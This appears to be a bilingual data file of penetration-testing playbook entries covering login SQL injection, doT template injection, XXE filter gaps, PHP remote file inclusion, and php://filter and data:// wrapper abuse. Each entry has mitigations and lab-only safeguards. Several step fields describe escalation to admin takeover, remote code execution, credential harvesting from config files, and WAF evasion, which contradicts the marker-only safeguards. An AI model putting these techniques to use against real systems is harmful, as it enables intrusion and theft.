overview.en: Covers login authentication SQL injection verification: quote, always-true boolean, and comment-boundary variants applied to login identity fields, with always-true rows returning login success confirming authentication bypass. Suitable for login entries concatenating username or password into WHERE clauses.

vulnerability.zh: 根因是用户名或密码直接拼接进 WHERE 条件，攻击输入通过闭合引号、恒真谓词或注释剩余比较使数据库返回非预期用户行；应用若只取第一行便建立错误主体会话。
vulnerability.en: The root cause is username or password concatenated directly into WHERE clauses: attacker input closes quotes, adds always-true predicates, or comments out the remaining comparison so the database returns unexpected user rows; an application taking the first row then establishes a wrong-principal session.

exploitation.zh: 使用第 1 步命令对授权测试账户字段逐条提交变体，与随机错误密码、引号控制输入和有效登录对照；恒真变体行返回登录成功即确认认证绕过成立。不要对真实管理员账户批量尝试；建立会话后访问只属于该测试主体的无副作用资源确认身份。
exploitation.en: Use the step 1 command to submit variants one by one against authorized test-account fields, compared with random wrong passwords, quote-control inputs, and valid logins; an always-true variant returning login success confirms the authentication bypass. Never spray real admin accounts; once a session is established, confirm identity by accessing side-effect-free resources belonging only to the test principal.

mitigation.zh: 所有登录查询参数化并严格类型绑定，不动态拼接标识符或条件；密码用独立哈希验证而非 SQL 明文比较，统一失败响应并限速，监控查询语法错误与异常会话建立。
mitigation.en: Parameterize all login queries with strict type binding and never concatenate identifiers or conditions; verify passwords via independent hashing rather than SQL plaintext comparison, unify failure responses with rate limits, and monitor query syntax errors and abnormal session establishments.

description.zh: 打开登录页确认用户名与口令字段及请求格式，用错误口令提交一次观察失败响应样式，即掌握判断绕过成功的标尺。
description.en: Inspect the login fields and request shape and submit a wrong password once; the failure signature becomes the success yardstick.

title.zh: 提交恒真变体绕过认证
title.en: Submit tautology variants to bypass auth

description.zh: 用执行区载荷逐条在账户字段注入OR恒真与注释变体，任一请求返回登录成功或跳转后台即确认认证被绕过。
description.en: Inject the OR tautologies and comment variants from the execution payload; any success redirect confirms the auth bypass.

description.zh: 用绕过得到的会话访问后台功能与用户管理接口，读取现有管理员信息后构造提权请求，拿到高权会话即完成接管。
description.en: Use the bypassed session to reach admin functions, read existing admins and forge an escalation request; a privileged session completes the takeover.

prerequisites.zh: 登录标识或密码进入关系型数据库查询
prerequisites.en: A login identifier or password reaches a relational database query.

prerequisites.zh: 使用专用测试账户和可审计数据库副本
prerequisites.en: A dedicated test account and auditable database copy are available.

analysis.zh: 确认链应同时包含查询结构变化、非预期用户行和有效服务端会话。只看到数据库错误属于注入线索，但尚未证明认证绕过。
analysis.en: Confirmation should include altered query structure, an unintended user row, and a valid server-side session. A database error is an injection signal but does not yet prove authentication bypass.

opsecTips.zh: 仅使用专用测试账号与数据库副本，不探测真实管理员用户名。
opsecTips.en: Use only dedicated test accounts and a database copy; do not probe real administrator usernames.

opsecTips.zh: 严格限速并在每次尝试后注销测试会话，避免锁定和审计噪声。
opsecTips.en: Rate-limit strictly and log out test sessions after each attempt to avoid lockouts and audit noise.

description.zh: 绕过登录表单的明文特征过滤：载荷百分号编码并混合大小写；认证通过或用户面板跳转即成功。
description.en: Percent-encode and case-mix the payload against plaintext login-form filters; a passed authentication or user-panel redirect confirms success.

description.zh: 绕过对成对引号比较的拦截：右侧用十六进制字面量构造恒真；登录绕过即成功。
description.en: Build the tautology with hex literals instead of paired quotes; a bypassed login confirms success.

description.zh: 绕过 JSON 登录接口的体扫描：引号转义为 \u0027 到应用层还原；以 admin 身份登录即成功。
description.en: Escape the quote for JSON login APIs restoring it at the app layer; logging in as admin confirms success.

description.zh: 绕过空格分词与引号对特征的组合规则：注释替代空格连接谓词；认证被绕过即成功。
description.en: Connect predicates with comments instead of spaces against combined spacing/quote rules; a bypassed authentication confirms success.

name.zh: 二阶 doT 插值算术求值

description.zh: 验证存储值是否被 doT 风格 `{{= ... }}` 插值语法再次编译，以常量算术输出区分模板求值与字面回显。
description.en: Tests whether a stored value is recompiled with doT-style {{= ... }} interpolation syntax, using constant arithmetic output to distinguish template evaluation from literal reflection.

overview.zh: 覆盖 doT 的二阶插值求值验证：把 {{= ... }} 常量表达式存入实验字段并触发 doT 渲染，同一任务产物出现 49 才证明求值。用于确认存储值被 doT 风格语法再次编译。
overview.en: Covers second-order interpolation evaluation for doT: storing a {{= ... }} constant expression in an experimental field and triggering doT rendering, proven only when the same task's artifact shows 49. Used to confirm stored values are re-compiled under doT syntax.

vulnerability.zh: 根因是应用把用户控制的数据库字段拼进 doT 模板源码，字段从数据参数变为可解析表达式；单纯显示双花括号不构成二阶模板注入。
vulnerability.en: The root cause is user-controlled database fields composed into doT template source, turning the field from a data parameter into a parseable expression; merely displaying double braces is not second-order template injection.

exploitation.zh: 使用第 1 步命令把该表达式存入实验字段并触发一次 doT 渲染；同一任务产物出现 49 才证明求值。先建立纯文本对照，再写入单一算术标记，关联队列、编译日志与产物中的 49，排除客户端或字面回显。多次触发任务结果一致才算确认，单次命中需复测排除缓存。
exploitation.en: Use the step 1 command to store the expression in an experimental field and trigger one doT render; 49 in the same task's artifact proves evaluation. Establish a plain-text control first, then store the single arithmetic marker and correlate queue, compilation logs, and the artifact's 49, excluding client-side or literal echo. Confirm only across repeated task runs with consistent results, re-testing single hits to rule out caches.

mitigation.zh: 使用固定 doT 模板并只传入结构化数据，禁止从持久化字段构造模板源码，限制模板上下文并回归字面输出。
mitigation.en: Use fixed doT templates passing only structured data, forbid constructing template source from persisted fields, restrict template context, and regression-test literal output.

description.zh: 寻找先保存后由服务端用doT模板渲染展示的字段，如昵称、备注或模板名，正常内容回显正确即锁定注入载体。
description.en: Find fields saved then rendered server-side by doT, such as nicknames or template names; correct echo of plain content locks the carrier.

title.zh: 提交算术插值探测求值
title.en: Submit arithmetic interpolation to probe evaluation

description.zh: 用执行区载荷在该字段存入算术插值表达式并触发渲染，页面出现49而非原字符串即确认服务端模板求值开启。
description.en: Store the arithmetic interpolation from the execution payload and render; 49 instead of the literal string confirms template evaluation.

title.en: Escalate to a command execution payload

description.zh: 把插值表达式换成doT可用的全局对象调用执行系统命令，沿用第2步的提交方式触发，命令输出回显即拿到RCE。
description.en: Swap the expression for a doT global-object call running system commands, triggering as in step 2; command output means RCE.

prerequisites.zh: 已通过依赖、构建工件或服务端日志确认后续任务使用 doT 兼容模板，而不是仅看到双花括号文本。
prerequisites.en: Dependencies, build artifacts, or server logs confirm that the later job uses a doT-compatible template rather than merely displaying double-brace text.

prerequisites.zh: 使用合成记录、单次任务和固定算术，不引用模板对象、函数、文件或网络。
prerequisites.en: Use a synthetic record, one job, and fixed arithmetic without referencing template objects, functions, files, or network resources.

analysis.zh: 只有服务器后续任务把该 token 求值为 49 才是阳性；前端 JavaScript、字面回显、错误页或首次请求立即处理均不足。
analysis.en: Only a later server job evaluating the token to 49 is positive; client JavaScript, literal reflection, an error page, or immediate first-request handling is insufficient.

opsecTips.zh: 固定一次任务和一个合成字段，不进行对象遍历或函数调用。
opsecTips.en: Use one job and one synthetic field without object traversal or function calls.

opsecTips.zh: 测试后删除记录、产物与模板缓存，并核对 worker 无残留任务。
opsecTips.en: Delete records, artifacts, and template caches afterward and verify that no worker jobs remain.

description.zh: 立即执行函数改写形态。判据：输出 49。
description.en: IIFE form. Success: prints 49.

description.zh: 两段式赋值输出。判据：输出 49。
description.en: Two-stage assignment. Success: prints 49.

description.zh: Node 环境下直达子进程。判据：回显 uid。
description.en: Reaches the Node child process directly. Success: uid echoed.

description.zh: ! 免转义插值变体。判据：输出 49。
description.en: Unescaped interpolation variant. Success: prints 49.

name.zh: 内联 DOCTYPE 实体过滤差异

description.zh: 使用最小内联外部实体声明验证 WAF 与后端 XML 解析器是否对 DOCTYPE 和外部资源执行一致阻断。
description.en: Uses a minimal inline external-entity declaration to verify consistent DOCTYPE and external-resource blocking between the WAF and backend XML parser.

subCategory.zh: 基础实体注入与过滤差异

overview.zh: 覆盖 DOCTYPE 解析的边界一致性验证：以最小内联外部实体声明嵌入目标接受的完整 XML 文档，对比边界设备与后端解析器的放行/拒绝差异。
overview.en: Covers boundary-consistency verification of DOCTYPE parsing: embedding a minimal inline external-entity declaration into a complete XML document the target accepts, contrasting pass/reject differences between edge devices and the backend parser.

vulnerability.zh: 根因是解析器默认允许外部资源而边界过滤只匹配特定大小写、空白或文档结构；WAF 与解析器对编码与文法理解不同时，声明到达解析器即触发文件或网络访问。
vulnerability.en: The root cause is parsers allowing external resources by default while edge filtering matches only specific case, whitespace, or document structures; when WAF and parser understand encoding and grammar differently, declarations reach the parser and trigger file or network access.

exploitation.zh: 使用第 1 步命令提交最小外部实体声明片段并嵌入目标接受的完整 XML 文档；对比边界设备与后端解析器的放行/拒绝差异即确认 DOCTYPE 处理边界，把系统路径替换为隔离环境的无敏感标记。先发送不含 DOCTYPE 的合法 XML 基线，再关联 WAF、应用与解析器日志观察标记出现位置。
exploitation.en: Use the step 1 command to submit the minimal external-entity declaration fragment embedded in a complete XML document the target accepts; pass/reject differences between edge device and backend parser confirm the DOCTYPE processing boundary, with system paths replaced by non-sensitive markers in the isolated environment. Send a DOCTYPE-free valid XML baseline first, then correlate WAF, application, and parser logs for marker appearances.

mitigation.zh: 在每个 XML 入口禁用 DOCTYPE、外部通用实体、参数实体与 XInclude，并限制解析任务的文件系统与出站网络；WAF 仅作补充控制，修复测试直接覆盖实际解析库与异步处理链。
mitigation.en: Disable DOCTYPE, external general entities, parameter entities, and XInclude at every XML entry while limiting parse-task filesystems and egress; keep the WAF as a supplementary control, with fix tests directly covering the actual parsing libraries and async processing chains.

title.zh: 摸清防护设备拦截行为
title.en: Profile the edge device's blocking behavior

description.zh: 向XML接口分别提交含DOCTYPE、ENTITY关键字与正常文档，记录哪些被拦截，即掌握边界设备的过滤规则轮廓。
description.en: Submit DOCTYPE-bearing, ENTITY-keyword, and plain documents to map which the edge blocks; the pattern sketches the filter.

title.zh: 提交最小实体声明测差异
title.en: Submit a minimal entity declaration to find gaps

description.zh: 用执行区载荷把最小外部实体声明嵌入合法文档提交，后端解析器处理了实体而边界放行，即确认两侧判定存在差异。
description.en: Embed the minimal entity declaration into a valid document per the execution payload; the backend parsing while the edge passes confirms the gap.

title.zh: 用复测载荷验证绕过稳定
title.en: Re-verify the bypass with the retest payload

description.zh: 用wafBypass区的同形载荷再次提交并观察拦截日志，请求持续放行且解析发生即确认绕过路径稳定可用。
description.en: Resubmit the same-shaped wafBypass payload and watch block logs; repeated passes with parsing confirm a stable bypass.

title.en: Launch full XXE through the gap

description.zh: 沿用第2步的放行结构，把实体目标换成敏感文件与内网地址，读到内容或收到回连即完成穿透后的利用。
description.en: Reuse the passing structure with entities aimed at sensitive files and internal hosts; content or callbacks complete post-bypass exploitation.

prerequisites.zh: 目标端点实际解析 XML 或 XML 派生格式
prerequisites.en: The endpoint actually parses XML or an XML-derived format.

prerequisites.zh: 测试环境提供无敏感标记资源或受控回连端点
prerequisites.en: The test environment provides a nonsensitive marker resource or controlled callback endpoint.

analysis.zh: 确认 XXE 需要把输入与具体解析器副作用关联；边界规则是否命中只是控制效果，不能替代文件读取、受控外连或实体展开证据。
analysis.en: XXE confirmation requires linking input to a concrete parser side effect. An edge-rule hit measures a control, not file access, controlled egress, or entity-expansion evidence.

opsecTips.zh: 在验证前把系统敏感路径替换为测试容器中的标记文件，避免读取真实凭据。
opsecTips.en: Replace sensitive system paths with a marker file in a test container before validation to avoid reading real credentials.

opsecTips.zh: 限制 XML 大小和实体数量，避免测试触发实体扩展型资源耗尽。
opsecTips.en: Limit XML size and entity count so testing cannot trigger entity-expansion resource exhaustion.

name.zh: RFI 回环 HTTP Marker 包含边界
name.en: RFI Loopback HTTP Marker Inclusion Boundary

description.zh: 使用只返回纯文本 marker 的回环 HTTP 服务验证远程资源是否进入服务端 include/template Sink，不提供任何脚本内容。
description.en: Uses a loopback HTTP service returning plain-text markers only to test whether a remote resource reaches a server include or template sink without serving script content.

subCategory.zh: PHP 流包装器与远程包含

overview.zh: RFI 回环 HTTP Marker 包含边界针对远程文件包含场景：用户控制的 URL 进入服务端 include/模板加载器。验证使用只返回纯文本 marker 的回环 HTTP 服务，覆盖网络获取、include Sink 与服务端解释三个阶段的证据采集。
overview.en: The RFI loopback HTTP marker inclusion boundary targets remote file inclusion, where a user-controlled URL reaches the server-side include/template loader. Validation uses a loopback HTTP service that only returns a plain-text marker, covering evidence for network fetch, the include sink, and server-side interpretation.

vulnerability.zh: 根因是应用把用户控制的 URL 直接交给 include/require 或等价模板加载器，且运行时允许远程资源（如 allow_url_include 开启），远程内容因此跨越数据边界进入服务端解析上下文。
vulnerability.en: The root cause is that the application passes a user-controlled URL directly to include/require or an equivalent template loader while the runtime allows remote resources (e.g., allow_url_include on), so remote content crosses the data boundary into server-side interpretation.

exploitation.zh: 先在授权范围内启动回环 marker 服务，再按第 1 步向包含入口提交 ?file=http://127.0.0.1:18080/PAYLOADER_MARKER.txt；命中判据为 marker 服务日志收到该 URL 的 GET 请求且应用响应包含 marker 文本，两者同时成立才证明远程内容进入服务端包含语义。逐条记录服务端首包与 include 调用栈，构成 RFI 成立的完整证据。
exploitation.en: Start the loopback marker service within scope, then submit ?file=http://127.0.0.1:18080/PAYLOADER_MARKER.txt to the inclusion endpoint as in step 1; a hit requires both a GET for that URL in the marker service log and the marker text in the application response, proving remote content reached server-side inclusion semantics. Record the server first packet and include call stack for each request as complete RFI evidence.

mitigation.zh: 禁止用户输入参与模板或文件路径，关闭不需要的远程包含能力，使用固定资源映射与 allowlist，并对 URL 规范化后再次授权；运行身份应限制网络与文件权限。修复后重放第 1 步请求，确认 marker 服务不再收到请求。
mitigation.en: Keep user input out of template and file paths, disable unneeded remote-inclusion capability, use fixed resource mapping with an allowlist, and re-authorize after URL normalization; run with restricted network and file permissions. After the fix, replay the step-1 request and confirm the marker service receives nothing.

description.zh: 在URL中寻找file、page、path等控制服务端加载内容的参数，先传正常文件名观察响应变化，参数生效即锁定入口。
description.en: Hunt for file/page/path parameters steering server-side loads; a normal filename changing the response locks the entry.

title.zh: 提交回环URL验证远程包含
title.en: Submit a loopback URL to confirm RFI

description.zh: 用执行区载荷把参数指向本地HTTP服务上的标记文件，响应中出现标记内容且服务日志记录到请求即确认远程包含成立。
description.en: Point the parameter at a marker file on a local HTTP service per the execution payload; marker content plus a logged GET confirms RFI.

title.zh: 托管恶意脚本获取执行
title.en: Host a malicious script for execution

description.zh: 在HTTP服务上放置PHP脚本并让参数指向它，沿用第2步的提交方式触发包含，脚本执行结果回显即完成远程代码执行。
description.en: Serve a PHP script and point the parameter at it, triggering as in step 2; execution output completes remote code execution.

prerequisites.zh: 目标服务端语言和配置允许远程 URL 进入 include/require 类 Sink；仅 URL 出现在响应、客户端请求或普通 HTTP fetch 不构成 RFI。
prerequisites.en: The server language and configuration permit a remote URL to reach an include or require-style sink; a URL in a response, a client request, or an ordinary HTTP fetch does not constitute RFI.

prerequisites.zh: 准备只绑定 127.0.0.1 的短文本 marker 服务、单次请求、应用访问日志和模板/包含调用栈，不提供脚本代码。
prerequisites.en: Prepare a short-text marker service bound only to 127.0.0.1, one request, application access logs, and template or include call-stack evidence without serving script code.

analysis.zh: 阳性要求应用进程获取该 token 且 include/template Sink 消费响应；普通 HTTP 客户端请求、URL 回显或连接错误不算。
analysis.en: A positive requires the application process to fetch this token and the include or template sink to consume the response; an ordinary HTTP client request, URL reflection, or connection error does not count.

opsecTips.zh: 只提供短纯文本 marker，出现脚本解释、子进程、外连、真实文件访问或 worker 异常时停止。
opsecTips.en: Serve short plain-text markers only and stop on script interpretation, child processes, egress, real-file access, or worker anomalies.

opsecTips.zh: 测试后停止回环服务、删除临时目录和日志，清空模板/URL 缓存并回归正常本地模板。
opsecTips.en: Stop the loopback service, delete temporary directories and logs, clear template and URL caches, and regress normal local templates afterward.

description.zh: 绕过对 http:// 前缀黑名单：省略协议的 // 开头在 include 上下文按 http 解析；远程 marker 内容被包含执行即成功。
description.en: Omit the scheme so // resolves as http in the include context past prefix blacklists; the remote marker being included confirms success.

description.zh: 绕过对 http://127.0.0.1 精确形态的匹配：多余斜杠归一化后等价；远程内容包含成功即成功。
description.en: Add redundant slashes that normalize back to the same URL past exact-form matching; successful inclusion of remote content confirms success.

description.zh: 绕过对明文协议头的扫描：整个 URL 百分号编码，应用解码后发起远程包含；marker 内容执行即成功。
description.en: Percent-encode the entire URL so plaintext scheme scanning misses it; the marker executing after decode confirms success.

name.zh: RFI HTTP Scheme 大小写规范化边界

description.zh: 逐条比较混合大小写与大写 HTTP scheme 在校验器、URL parser 和远程包含 Sink 中是否被一致规范化。
description.en: Compares mixed-case and uppercase HTTP schemes one at a time to determine whether validators, URL parsers, and remote-inclusion sinks normalize them consistently.

subCategory.zh: PHP 流包装器与远程包含

overview.zh: RFI HTTP Scheme 大小写规范化边界针对校验器与 URL 解析器对 scheme 大小写处理不一致的远程包含场景。使用 HtTp:// 与 HTTP:// 两种形式逐条对照，验证校验值、parser 规范化结果与远程包含结果是否一致。
overview.en: The RFI HTTP scheme-case normalization boundary targets remote inclusion where the validator and URL parser disagree on scheme case. Using HtTp:// and HTTP:// forms side by side, it checks whether the validated value, parser normalization result, and inclusion outcome are consistent.

vulnerability.zh: 根因是应用把用户控制的 URL 交给 include/require 且运行时允许远程资源，而 scheme 校验只在原始字符串层面匹配固定形式，大小写在解析阶段被规范化后绕过拦截。
vulnerability.en: The root cause is that the application hands a user-controlled URL to include/require while the runtime allows remote resources, and scheme validation matches a fixed form only at the raw-string level, so case is normalized away during parsing and bypasses the block.

exploitation.zh: 按第 1 步的对照依次提交 HtTp:// 与 HTTP:// 两种大小写形式，每次只提交一行，分别记录校验值、parser 规范化结果与 marker 首包；命中判据为两种形式均返回 marker 内容且解析日志记录为同一规范化 scheme。命中即证明 scheme 校验可被大小写规范化绕过，可继续扩展到混合大小写与其他协议形式。
exploitation.en: Submit the HtTp:// and HTTP:// case forms in turn as in step 1, one line per request, recording the validated value, parser normalization result, and marker first packet each time; a hit is both forms returning marker content with the parse log recording the same normalized scheme. A hit proves scheme validation can be bypassed via case normalization; extend to mixed case and other protocol forms next.

mitigation.zh: 对 URL 先规范化再做 scheme allowlist 校验，拒绝用户输入参与模板或文件路径，关闭不需要的远程包含；运行身份限制网络与文件权限。修复后重放第 1 步两种大小写形式，确认校验层与解析层结论一致且请求被统一拒绝。
mitigation.en: Normalize URLs before scheme allowlist validation, keep user input out of template and file paths, and disable unneeded remote inclusion; restrict runtime network and file permissions. After the fix, replay both case forms from step 1 and confirm validator and parser agree and requests are uniformly rejected.

title.zh: 测试常规形式拦截情况
title.en: Test how plain forms are handled

description.zh: 用小写http形式提交远程地址观察是否被拦截或拒绝，记录拦截提示样式，即得到需要绕过的具体规则表现。
description.en: Submit the lowercase http form and record any block message; the signature defines the rule to bypass.

title.zh: 提交大小写变形绕过校验
title.en: Submit case variants to slip past validation

description.zh: 用执行区载荷分别提交混合大小写与全大写scheme，任一形式返回标记内容即确认校验只匹配固定小写而包含器仍识别。
description.en: Submit mixed-case and uppercase schemes per the execution payload; any form returning the marker confirms validation matches only lowercase while include still resolves.

title.zh: 借绕过路径执行远程代码
title.en: Execute remote code through the gap

description.zh: 沿用第2步放行的变形形式把参数指向托管的脚本，页面出现执行输出即把绕过转化为代码执行立足点。
description.en: Reuse the passing variant to point at the hosted script; execution output converts the bypass into a code-execution foothold.

prerequisites.zh: 目标服务端语言和配置允许远程 URL 进入 include/require 类 Sink；仅 URL 出现在响应、客户端请求或普通 HTTP fetch 不构成 RFI。
prerequisites.en: The server language and configuration permit a remote URL to reach an include or require-style sink; a URL in a response, a client request, or an ordinary HTTP fetch does not constitute RFI.

prerequisites.zh: 准备只绑定 127.0.0.1 的短文本 marker 服务、单次请求、应用访问日志和模板/包含调用栈，不提供脚本代码。
prerequisites.en: Prepare a short-text marker service bound only to 127.0.0.1, one request, application access logs, and template or include call-stack evidence without serving script code.

analysis.zh: 大小写 scheme 只有在校验层拒绝而 include 层规范化并访问同一 marker 时才证明差异；两个层都接受或都拒绝不是绕过。
analysis.en: A scheme-case difference is proven only when validation rejects while the include layer normalizes and fetches the same marker; both layers accepting or rejecting is not a bypass.

opsecTips.zh: 只提供短纯文本 marker，出现脚本解释、子进程、外连、真实文件访问或 worker 异常时停止。
opsecTips.en: Serve short plain-text markers only and stop on script interpretation, child processes, egress, real-file access, or worker anomalies.

opsecTips.zh: 测试后停止回环服务、删除临时目录和日志，清空模板/URL 缓存并回归正常本地模板。
opsecTips.en: Stop the loopback service, delete temporary directories and logs, clear template and URL caches, and regress normal local templates afterward.

description.zh: 绕过按 @ 后主机校验不足的过滤器：userinfo 段伪装资源域，实际主机仍是回环；远程内容包含即成功。
description.en: Carry a decoy userinfo segment while the real host remains the loopback; inclusion of remote content confirms success.

description.zh: 绕过对无尾点主机精确匹配：尾点解析等价并混合协议大小写；marker 包含成功即成功。
description.en: Append the resolving-equivalent trailing dot with mixed scheme case; successful marker inclusion confirms success.

description.zh: 绕过对以 .txt 结尾路径的特征匹配：附加伪片段改变尾部形态，取资源时被剥离；内容包含即成功。
description.en: Append a pseudo-fragment altering the suffix while fetchers strip it; content inclusion confirms success.

name.zh: PHP Filter 源码读取边界

description.zh: 使用七个原始 php://filter 变体验证文件读取入口是否允许过滤器对目标资源编码，并把源码读取与普通文件响应区分开。
description.en: Uses seven original php://filter variants to verify whether a file-reading sink permits filtered encoding of a target resource and distinguishes source disclosure from an ordinary file response.

subCategory.zh: PHP 流包装器与远程包含

overview.zh: PHP Filter 源码读取边界针对文件读取入口允许过滤器对目标资源编码的场景：php://filter 可把本应执行的源码以数据返回。验证七个原始 php://filter 变体在隔离 marker 文件上的行为。
overview.en: The PHP filter source-read boundary targets read entries letting filters encode target resources: php://filter can return would-be-executed source as data. It validates seven original php://filter variants against isolated marker files.

vulnerability.zh: 当用户控制的资源 URI 进入读取或包含 API，且没有固定根目录、对象映射和 scheme 限制时，过滤器可能暴露本应由解释器执行的源码；过滤器被识别、URI 被回显或目标文件不存在都不足以确认。
vulnerability.en: When user-controlled resource URIs enter read or include APIs without fixed roots, object mapping, or scheme restrictions, filters can expose source meant only for the interpreter; a recognized filter, echoed URI, or missing target does not suffice for confirmation.

exploitation.zh: 按第 1 步把七个变体逐行替换为隔离标记文件后提交，每次记录原始 URI、规范路径、过滤器选择和响应；命中判据为响应是 Base64 串且解码后等于标记文件内容，证明过滤器被应用且目标被读取而非执行。先验证读取 API 是否支持 wrapper，再判断 filter 语法是否适用；全部以标记文件为目标，不读取系统或业务文件。
exploitation.en: Per step 1, replace the seven variants line by line with isolated marker files before submitting, recording the raw URI, canonical path, filter choice, and response each time; a hit is a Base64 response decoding to the marker-file content, proving the filter applied and the target was read rather than executed. First confirm the read API supports wrappers, then whether the filter syntax applies; always target marker files, never system or business files.

mitigation.zh: 将外部输入映射为服务端对象 ID，在固定根目录内解析并验证真实路径，拒绝非 file scheme，且禁止用户数据进入 include/require。修复后同时重放合法对象、越界路径和第 1 步全部 filter 变体，确认源码不可编码返回且正常读取可用。
mitigation.en: Map external input to server-side object IDs, resolve and verify real paths within a fixed root, reject non-file schemes, and keep user data out of include/require. After the fix, replay legitimate objects, out-of-bounds paths, and all step-1 filter variants together, confirming source cannot be encoded out while normal reads work.

title.zh: 确认包含点与读取函数
title.en: Confirm the inclusion point and reader

description.zh: 定位控制文件加载的参数并测试普通路径读取成功，响应能返回本地文件内容即确认LFI原语，准备wrapper升级。
description.en: Locate the file-loading parameter and confirm a plain path read; returned local content establishes the LFI primitive for wrapper escalation.

title.en: Read source through the filter chain

description.zh: 用执行区载荷提交php://filter的base64编码读取目标入口文件，响应为Base64串且解码为PHP源码即确认读取成功。
description.en: Submit the base64 filter read per the execution payload; a Base64 blob decoding to PHP source confirms the read.

description.zh: 解码取得的源码查找包含点、命令调用与硬编码口令，复验任一漏洞成立即把文件读取升级为更深的执行路径。
description.en: Mine the decoded source for includes, command calls, and hardcoded secrets; one confirmed flaw deepens read into execution.

description.zh: 把filter的resource换成php.ini与应用配置文件路径，沿用第2步的载荷形式读取，拿到口令与路径信息即扩大战果。
description.en: Aim the filter resource at php.ini and app configs with the step-2 form; passwords and paths complete the haul.

prerequisites.zh: 已确认参数进入 fopen、file_get_contents、include 或 require 之一，并记录具体 API
prerequisites.en: The parameter is confirmed to reach fopen, file_get_contents, include, or require, and the exact API is recorded.

prerequisites.zh: 隔离环境提供仅含随机标记的 PHP 文件，且可关联应用日志与文件审计
prerequisites.en: The isolated environment provides a PHP file containing only a random marker, with correlated application and file-audit logs.

analysis.zh: 确认边界要求同一请求同时具备 filter 被实际处理、应用进程读取隔离文件、响应可还原随机标记三项证据。仅看到 Base64 字符、PHP 警告或 URI 回显都不是源码泄露。
analysis.en: Confirmation requires three correlated facts in one request: the filter was processed, the application process read the isolated file, and the response reconstructs the random marker. Base64 characters, PHP warnings, or URI reflection alone do not prove source disclosure.

opsecTips.zh: 所有资源路径先改为随机标记文件；若返回真实源码或系统内容立即停止并保留请求 ID
opsecTips.en: Replace every resource path with the random-marker file first; stop immediately and retain the request identifier if real source or system content appears.

opsecTips.zh: 完成后删除标记文件、解码副本和临时日志导出，并复核没有访问原始敏感路径
opsecTips.en: Afterward delete the marker file, decoded copies, and temporary log exports, and verify that no original sensitive path was accessed.

description.zh: 绕过对单一 convert 过滤器特征：叠加读取方向过滤链；先反转 ROT13 再解码即得源码。
description.en: Chain read-direction filters past single-filter signatures; reversing ROT13 then decoding yields the source.

description.zh: 绕过对 index.php 相对引用的规则：绝对化并冗余分隔符定位同一文件；Base64 解码得源码即成功。
description.en: Target the same file via an absolutized, separator-padded resource; decoding the output yields the source.

description.zh: 绕过对 base64 关键字的过滤：改用可打印引用编码读取；按 QP 解码输出即成功。
description.en: Read via quoted-printable to evade base64 keyword filters; decoding the QP output confirms success.

name.zh: PHP Data Wrapper 包含边界

description.zh: 保留两条 data:// 内联流样例，用于区分普通流读取与 allow_url_include 条件下的服务端代码解释。
description.en: Preserves two data:// inline-stream samples to distinguish ordinary stream reading from server-side interpretation under allow_url_include conditions.

subCategory.zh: PHP 流包装器与远程包含

overview.zh: PHP Data Wrapper 包含边界针对 data:// 内联流进入读取或包含 API 的场景：普通流读取与服务端代码解释是两个不同安全结果。验证 Base64 内联流在 allow_url_include 条件下的行为。
overview.en: The PHP data-wrapper inclusion boundary targets data:// inline streams entering read or include APIs: ordinary stream reads and server-side code interpretation are two different security outcomes. It validates Base64 inline streams under allow_url_include conditions.

vulnerability.zh: 用户输入进入 include/require 且 URL include 被启用时，内联流可能被解释为服务器端代码；若仅由 file_get_contents 读取、作为文本回显或被配置拒绝，则不构成代码执行。
vulnerability.en: When user input reaches include/require with URL include enabled, inline streams can be interpreted as server-side code; if only read by file_get_contents, echoed as text, or rejected by configuration, there is no code execution.

exploitation.zh: 按第 1 步保留两条原始 Base64 串作追溯，实际测试前重编码为只设置请求内随机标记的 PHP 片段，每次提交一条到包含入口；命中判据为包含后页面输出标记字符串，证明 data:// 流被包含并解释。同时记录 allow_url_include 配置与最终函数（读取还是 include）；若流仅作为文本返回，记录为读取边界命中而非代码执行。
exploitation.en: Keep the two original Base64 strings from step 1 for traceability, but before testing re-encode them as PHP fragments that only set a request-random marker, submitting one per request to the inclusion entry; a hit is the marker string in the page after inclusion, proving the data:// stream was included and interpreted. Record the allow_url_include configuration and the final function (read vs include); if the stream only returns as text, log it as a read-boundary hit, not code execution.

mitigation.zh: 禁止外部输入控制 include/require，关闭不需要的 allow_url_include，并用明确路由映射加载固定模板。修复后重放第 1 步构造的 data 流，确认在解释前被拒绝且合法模板继续工作。
mitigation.en: Keep external input from controlling include/require, disable unneeded allow_url_include, and load fixed templates via explicit route mapping. After the fix, replay the step-1 data streams and confirm rejection before interpretation while legitimate templates keep working.

description.zh: 确认参数最终进入include且allow_url_include开启，用只读形式测试wrapper被接受，即具备data流注入前提。
description.en: Verify the parameter reaches include with allow_url_include on and wrappers accepted; data-stream injection is viable.

title.en: Submit a data stream to confirm interpretation

description.zh: 用执行区载荷把参数指向base64编码PHP片段的data URI，页面输出编码内定义的标记即确认数据流被解释执行。
description.en: Point the parameter at the base64 PHP data URI per the execution payload; the marker printing confirms interpretation.

title.zh: 替换载荷执行系统命令
title.en: Swap the payload to run system commands

description.zh: 把data流内容换成接收cmd参数执行命令的脚本，沿用第2步的提交方式访问，命令输出返回即完成远程代码执行。
description.en: Rebuild the data stream as a cmd-driven script and revisit as in step 2; command output completes RCE.

prerequisites.zh: 已通过代码跟踪确认输入到达 include 或 require，而不是仅到达读取或回显函数
prerequisites.en: Code tracing confirms that input reaches include or require rather than only a read or reflection function.

prerequisites.zh: 已记录 allow_url_fopen、allow_url_include 和 data wrapper 状态，并使用无副作用标记脚本
prerequisites.en: allow_url_fopen, allow_url_include, and data-wrapper status are recorded, and a side-effect-free marker script is used.

analysis.zh: 有效发现必须证明 data 流进入 include/require 并被 PHP 解释为无副作用标记。仅能读取 URI 数据、返回编码文本、触发 warning 或看到 cmd 参数并不能证明代码执行。
analysis.en: A valid finding proves that the data stream reached include or require and PHP interpreted the side-effect-free marker. Reading URI data, returning encoded text, triggering a warning, or observing a cmd parameter does not prove code execution.

opsecTips.zh: 不得直接执行原始 system 或文件读取内容；先离线解码审查，再替换为单值随机标记
opsecTips.en: Never execute the original system or file-reading content; decode and inspect it offline first, then replace it with a one-value random marker.

opsecTips.zh: 一旦标记被解释即停止，清除 opcode/cache、请求日志中的编码片段和临时测试模板
opsecTips.en: Stop when the marker is interpreted and clear opcode or application caches, encoded fragments in request logs, and temporary test templates.

description.zh: 绕过对 data://text/plain 完整前缀匹配：省略 MIME 的合法简式；代码被包含执行即成功。
description.en: Use the legal MIME-less form past full-prefix matching; the code being included and executed confirms success.

description.zh: 绕过对 ;base64, 直接后缀载荷的检测：插入 charset 参数偏移位置；执行结果返回即成功。
